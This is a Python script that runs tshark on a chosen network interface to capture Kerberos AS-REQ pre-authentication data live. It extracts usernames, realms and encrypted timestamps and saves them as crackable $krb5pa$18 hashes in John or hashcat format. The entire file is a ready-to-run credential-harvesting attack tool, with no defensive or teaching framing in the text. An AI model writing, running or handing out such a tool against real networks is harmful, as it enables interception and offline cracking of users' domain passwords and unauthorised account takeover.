#!/usr/bin/env python3

import argparse
import datetime as dt
import os
import signal
import subprocess
import sys
from pathlib import Path
from typing import Optional, Tuple

TSHARK_PATH = "/usr/bin/tshark"  # Adjust if tshark is elsewhere


def check_tshark() -> None:
    if not os.path.exists(TSHARK_PATH):
        print(
            f"[!] tshark not found at {TSHARK_PATH}. Install Wireshark/tshark "
            f"and/or update TSHARK_PATH.",
            file=sys.stderr,
        )
        sys.exit(1)
    try:
        subprocess.run(
            [TSHARK_PATH, "-v"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=True,
        )
    except Exception as e:
        print(f"[!] Unable to run tshark: {e}", file=sys.stderr)
        sys.exit(1)


def prompt_interface() -> str:
    try:
        print("[*] Available network interfaces:")
        out = subprocess.check_output([TSHARK_PATH, "-D"], text=True)
        for line in out.strip().splitlines():
            print(f"\t{line}")
        print()
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to list interfaces: {e}", file=sys.stderr)
        sys.exit(1)

    iface = input("Enter interface number or name: ").strip()
    return iface


def ensure_output_dir(path: Path, no_files: bool) -> None:
    if not no_files:
        path.mkdir(parents=True, exist_ok=True)
        print(f"[+] Using output directory: {path}")
    else:
        print("[*] No output files will be created")

    return


def format_asreq_hash(username: str, domain: str, cipher: str, fmt: str) -> str:
    if fmt.lower() == "john":
        # John format requires an extra $ between domain and cipher
        return f"$krb5pa$18${username}${domain}$${cipher}"
    # Hashcat-style
    return f"$krb5pa$18${username}${domain}${cipher}"


def parse_asreq_line(line: str) -> Optional[Tuple[str, str, str]]:
    # tshark -E separator=$
    parts = line.strip().split("$")
    if len(parts) != 3:
        return None
    username, domain, cipher = parts
    if not username or not domain or not cipher:
        return None
    return username, domain, cipher


def write_output(out_dir: Path, username: str, domain: str, hash_str: str) -> None:
    user_file = out_dir / f"{username}_{domain}.txt"
    with user_file.open("a", encoding="utf-8") as f:
        f.write(f"{hash_str}\n")

class TsharkListener:
    def __init__(self, interface: str, out_dir: Path, fmt: str, no_files: bool) -> None:
        self.interface = interface
        self.out_dir = out_dir
        self.no_files = no_files
        self.format = fmt.lower()
        self.proc: Optional[subprocess.Popen] = None
        self.stop = False
        self.all_hashes_file = out_dir / f"all_hashes_{self.format}.txt"

    def start(self) -> None:
        display_filter = (
            "kerberos.msg_type == 10 && kerberos.CNameString && "
            "kerberos.realm && kerberos.cipher"
        )
        # -Q quiet, -n no name resolution, -l line-buffered stdout
        args = [
            TSHARK_PATH,
            "-Q",
            "-n",
            "-i",
            self.interface,
            "-Y",
            display_filter,
            "-T",
            "fields",
            "-e",
            "kerberos.CNameString",
            "-e",
            "kerberos.realm",
            "-e",
            "kerberos.cipher",
            "-E",
            "separator=$",
            "-l",
        ]

        # Start tshark in its own process group to kill cleanly
        self.proc = subprocess.Popen(
            args,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            bufsize=1,  # line-buffered
            universal_newlines=True,
            preexec_fn=os.setsid,  # create new process group on Unix
        )
        print(f"[+] Tshark started (PID: {self.proc.pid})")

    def run(self) -> None:
        assert self.proc and self.proc.stdout
        for line in self.proc.stdout:
            if self.stop:
                break
            line = line.strip()
            if not line:
                continue
            parsed = parse_asreq_line(line)
            if not parsed:
                continue
            username, domain, cipher = parsed


            hash_str = format_asreq_hash(username, domain, cipher, self.format)

            # Print to console
            ts = dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print(f"[+] {ts} - Captured AS-REQ for {username}@{domain}")
            print(hash_str)

            # Write to files
            if not self.no_files:
                write_output(self.out_dir, username, domain, hash_str)
                with self.all_hashes_file.open("a", encoding="utf-8") as f:
                    f.write(f"{hash_str}\n")

        # Drain and exit
        if self.proc and self.proc.poll() is None:
            try:
                self.proc.terminate()
            except Exception:
                pass

    def shutdown(self) -> None:
        self.stop = True
        if self.proc:
            try:
                # Kill the whole process group
                os.killpg(os.getpgid(self.proc.pid), signal.SIGTERM)
            except Exception:
                pass


def main():
    parser = argparse.ArgumentParser( description="Live Kerberos AS-REQ listener.")

    parser.add_argument( "-i", "--interface", help="Interface number or name (as tshark -D shows). If omitted, you will be prompted.", default=None)

    parser.add_argument("-o", "--output-dir", help="Directory to write output files", default="./kerberos_captures")
    parser.add_argument("-f","--format", choices=["john", "hashcat"], default="hashcat", help="Hash output format")
    parser.add_argument("-nf,","--no-files", action="store_true", help="Do not create output files")
    args = parser.parse_args()

    check_tshark()

    no_files = args.no_files
    interface = args.interface or prompt_interface()
    out_dir = Path(os.path.expanduser(args.output_dir))
    ensure_output_dir(out_dir, no_files)

    listener = TsharkListener(interface=interface, out_dir=out_dir, fmt=args.format, no_files=no_files)

    def handle_sigint(signum, frame):
        print("\n[!] Stopping listener...")
        listener.shutdown()

    signal.signal(signal.SIGINT, handle_sigint)
    signal.signal(signal.SIGTERM, handle_sigint)

    print("\nPress Ctrl+C to stop the listener at any time\n")
    print("=== Kerberos AS-REQ Live Listener ===")
    if no_files:
        print("[*] No output files will be created")
    else:
        print(f"[*] Output directory: {out_dir}")
    print(f"[*] Hash format: {args.format}")
    print(f"[*] Starting capture on interface: {interface}")
    print("[*] Listening for Kerberos AS-REQ packets...\n")

    try:
        listener.start()
        listener.run()
    finally:
        listener.shutdown()
        print("[+] Listener stopped. Check output files in:", out_dir)


if __name__ == "__main__":
    main()
